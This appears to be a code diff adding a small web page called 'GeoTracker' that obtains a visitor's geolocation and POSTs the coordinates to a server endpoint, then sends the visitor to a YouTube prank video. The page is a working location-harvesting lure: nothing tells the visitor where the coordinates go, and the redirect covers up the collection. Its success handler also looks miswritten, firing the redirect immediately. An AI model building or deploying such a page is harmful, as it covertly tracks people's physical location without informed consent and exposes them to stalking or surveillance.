@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>GeoTracker[v0.1.2]</title>
+    </head>
+
+    <body>
+        <div id="position"></div>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            if (navigator.geolocation)
+            {
+                navigator.geolocation.getCurrentPosition(function(position){
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+
+                    $.ajax({
+                        type: 'POST',
+                        url: 'https://127.0.0.1:8000/locate.php',
+                        data: {
+                            lat: lat,
+                            lon: lon
+                        },
+                        success:window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+                    });
+                });
+            }
+
+            else{
+                console.log('no tracking.');
+            }
+        </script>
+    </body>
+</html>
+
